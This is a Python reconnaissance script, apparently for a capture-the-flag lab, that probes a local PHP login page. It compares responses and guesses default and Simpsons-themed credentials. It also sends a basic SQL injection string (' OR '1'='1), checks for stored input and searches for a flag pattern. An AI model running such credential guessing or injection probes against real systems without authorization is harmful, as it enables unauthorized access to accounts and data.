import requests
import re

# Target configuration
target_url = "http://127.0.0.1:32989/index.php"

print("RESPONSE DEEP ANALYSIS")
print("=" * 80)

# Get both GET and POST responses for comparison
print("\n[1] GET vs POST RESPONSE COMPARISON")
print("-" * 40)

get_resp = requests.get(target_url, timeout=10)
post_resp = requests.post(target_url, data={"username": "test", "password": "test"}, timeout=10)

print(f"GET response:")
print(f"  Status: {get_resp.status_code}")
print(f"  Length: {len(get_resp.text)} bytes")
print(f"  First 500 chars:\n{get_resp.text[:500]}")

print(f"\n\nPOST response:")
print(f"  Status: {post_resp.status_code}")
print(f"  Length: {len(post_resp.text)} bytes")
print(f"  First 500 chars:\n{post_resp.text[:500]}")

# Find the difference
print("\n\n[2] FINDING THE DIFFERENCE")
print("-" * 40)

if len(get_resp.text) != len(post_resp.text):
    print(f"Length difference: {len(post_resp.text) - len(get_resp.text)} bytes")
    
    # Find where they differ
    min_len = min(len(get_resp.text), len(post_resp.text))
    for i in range(min_len):
        if get_resp.text[i] != post_resp.text[i]:
            print(f"First difference at position {i}")
            print(f"GET:  ...{repr(get_resp.text[max(0,i-20):i+50])}...")
            print(f"POST: ...{repr(post_resp.text[max(0,i-20):i+50])}...")
            break
    else:
        # One is longer than the other
        print("One response is longer than the other")
        print(f"Extra content in POST: {repr(post_resp.text[len(get_resp.text):])}")

# 3. Test for successful authentication indicators
print("\n\n[3] AUTHENTICATION SUCCESS/FAILURE INDICATORS")
print("-" * 40)

# Test different credentials and look for response differences
test_cases = [
    ("", ""),
    ("admin", ""),
    ("", "admin"),
    ("admin", "admin"),
    ("admin", "wrong"),
    ("wrong", "admin"),
    ("bart", "bart"),
    ("homer", "homer"),
    ("simpson", "simpson"),
]

results = []
for user, pwd in test_cases:
    resp = requests.post(target_url, data={"username": user, "password": pwd}, timeout=10)
    results.append({
        'creds': f"{user}/{pwd}",
        'length': len(resp.text),
        'status': resp.status_code
    })

print("Credential tests:")
for r in results:
    print(f"  {r['creds']}: Status={r['status']}, Length={r['length']}")

# Check for unique lengths
lengths = set(r['length'] for r in results)
print(f"\nUnique lengths found: {lengths}")

# 4. Check response for hidden messages, comments, or structure changes
print("\n\n[4] RESPONSE STRUCTURE ANALYSIS")
print("-" * 40)

# Look for HTML comments
resp = requests.post(target_url, data={"username": "admin", "password": "admin"}, timeout=10)
comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
print(f"HTML comments found: {len(comments)}")
for i, c in enumerate(comments):
    print(f"  Comment {i+1}: {c.strip()[:100]}")

# Look for script sections
scripts = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.DOTALL | re.IGNORECASE)
print(f"\nScript sections: {len(scripts)}")

# Look for specific patterns
patterns = [
    (r'(?i)welcome', 'Welcome message'),
    (r'(?i)login', 'Login indicator'),
    (r'(?i)success', 'Success indicator'),
    (r'(?i)fail', 'Failure indicator'),
    (r'(?i)error', 'Error indicator'),
    (r'(?i)invalid', 'Invalid indicator'),
    (r'flag\{[^}]*\}', 'Flag pattern'),
]

print("\nPattern matching:")
for pattern, desc in patterns:
    matches = re.findall(pattern, resp.text)
    if matches:
        print(f"  {desc}: Found {len(matches)} matches - {matches[:3]}")

# 5. Test for second-order SQL injection or stored data
print("\n\n[5] TESTING FOR STORED/SECOND-ORDER EFFECTS")
print("-" * 40)

# Inject a unique string and see if it persists
unique_string = "TESTUSER12345"
requests.post(target_url, data={"username": unique_string, "password": "test"}, timeout=10)

# Check if it appears in subsequent responses
for i in range(3):
    resp = requests.post(target_url, data={"username": "admin", "password": "admin"}, timeout=10)
    if unique_string in resp.text:
        print(f"[!] Stored data detected - '{unique_string}' found in response {i+1}")
        break
else:
    print("No stored data detected")

# 6. Full HTML parsing - look for dynamic content
print("\n\n[6] FULL RESPONSE TEXT (SEARCHING FOR DYNAMIC CONTENT)")
print("-" * 40)

# Get response with different inputs and hash them to compare
import hashlib

def get_response_hash(username, password):
    resp = requests.post(target_url, data={"username": username, "password": password}, timeout=10)
    return hashlib.md5(resp.text.encode()).hexdigest()[:16]

test_inputs = [
    ("admin", "admin"),
    ("admin", "wrong"),
    ("' OR '1'='1", "x"),
    ("random", "random"),
]

print("Response hashes:")
hashes = set()
for user, pwd in test_inputs:
    h = get_response_hash(user, pwd)
    hashes.add(h)
    print(f"  {user}/{pwd}: {h}")

if len(hashes) == 1:
    print("\n[!] ALL RESPONSES IDENTICAL - No visible SQL injection indicators")
else:
    print(f"\n[*] Found {len(hashes)} unique responses")

print("\n\n[7] SIMPSONS-THEMED CREDENTIAL GUESSING")
print("-" * 40)

# Try common Simpsons-related credentials
simpsons_creds = [
    ("homer", "homer"),
    ("marge", "marge"),
    ("bart", "bart"),
    ("lisa", "lisa"),
    ("maggie", "maggie"),
    ("simpsons", "simpsons"),
    ("springfield", "springfield"),
    ("donut", "donut"),
    ("duff", "duff"),
    ("flanders", "flanders"),
    ("burns", "burns"),
    ("smithers", "smithers"),
    ("skinner", "skinner"),
    ("krusty", "krusty"),
    ("apu", "apu"),
    ("moe", "moe"),
    ("lenny", "lenny"),
    ("carl", "carl"),
    ("barney", "barney"),
    ("milhouse", "milhouse"),
]

for user, pwd in simpsons_creds:
    resp = requests.post(target_url, data={"username": user, "password": pwd}, timeout=10)
    # Check if response is different from baseline
    if len(resp.text) not in lengths or len(hashes) > 1:
        print(f"[*] Anomaly with {user}/{pwd}: Length={len(resp.text)}")
    else:
        print(f"  {user}/{pwd}: Same as baseline")

